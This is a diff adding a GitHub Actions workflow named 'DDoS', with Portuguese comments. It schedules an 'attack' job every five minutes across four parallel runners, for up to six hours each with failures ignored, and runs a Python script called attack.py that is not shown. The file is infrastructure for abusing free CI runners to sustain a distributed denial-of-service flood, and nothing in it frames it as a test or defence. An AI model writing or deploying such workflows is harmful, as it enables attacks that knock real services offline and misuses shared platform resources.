@@ -1,0 +1,23 @@
+name: DDoS
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/5 * * * *'   # a cada 5 min automaticamente
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360      # máximo permitido (6 h)
+    continue-on-error: true   # não falha se o step quebrar
+    strategy:
+      fail-fast: false
+      matrix:
+        instance: [1,2,3,4]   # 10 runners paralelos por job
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - run: pip install aiohttp psutil
+      - run: python attack.py
